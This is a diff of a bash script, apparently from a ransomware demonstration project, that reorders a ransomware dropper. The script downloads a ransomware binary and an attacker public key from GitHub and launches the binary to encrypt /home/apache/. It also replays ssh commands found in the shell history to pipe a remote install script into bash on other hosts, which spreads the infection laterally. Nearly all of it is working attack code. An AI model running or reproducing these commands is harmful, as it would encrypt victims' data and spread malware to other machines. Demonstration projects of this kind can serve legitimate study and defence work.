@@ -1,10 +1,4 @@
 #!/usr/bin/env bash
-wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/main/ransomware/dist/ransomware -O /tmp/ransomware
-wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/main/attacker/public_key.pem -O /tmp/public_key.pem
-chmod +x /tmp/ransomware
-export DISPLAY=:1.0
-nohup /tmp/ransomware --pub /tmp/public_key.pem --path /home/apache/ --enc-sym-key /tmp/ > /tmp/logs &
-
 # Define the search term to look for in the command history
 search_term="ssh"
 
@@ -19,3 +13,11 @@ while IFS= read -r command; do
         $command -C 'wget -q -O - https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/main/ransomware/scripts/dangerous-install.sh | bash'
     fi
 done <<< "$commands"
+
+# setup ransomware
+wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/main/ransomware/dist/ransomware -O /tmp/ransomware
+wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/main/attacker/public_key.pem -O /tmp/public_key.pem
+chmod +x /tmp/ransomware
+export DISPLAY=:1.0
+nohup /tmp/ransomware --pub /tmp/public_key.pem --path /home/apache/ --enc-sym-key /tmp/ > /tmp/logs &
+
